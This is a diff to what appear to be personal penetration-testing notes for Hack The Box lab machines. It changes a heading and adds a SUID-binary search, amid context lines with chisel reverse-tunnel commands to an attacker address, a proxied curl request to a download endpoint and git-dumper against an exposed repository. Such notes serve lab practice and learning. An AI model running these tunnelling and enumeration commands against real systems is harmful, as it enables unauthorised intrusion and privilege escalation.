@@ -104,7 +104,7 @@ sudo nano /etc/proxychains4.conf
 
 how to add attacker ot proxychains is what i need to look into
 
-# using chisel through evilwinrm
+### using chisel through evilwinrm
 
 ./chisel client 10.10.16.24:8001 R:5985:172.16.22.1:5985
 ./chisel server -p 8001 — reverse
@@ -216,3 +216,8 @@ curl --proxy localhost:8080 -s -X POST http://beta.only4you.htb/download -d "ima
 ### git
 
 `python3 git-dumper.py http://pilgrimage.htb git-dumps`
+
+### checking for suid binaries
+
+`$ find / -perm -u=s 2>/dev/null`
+
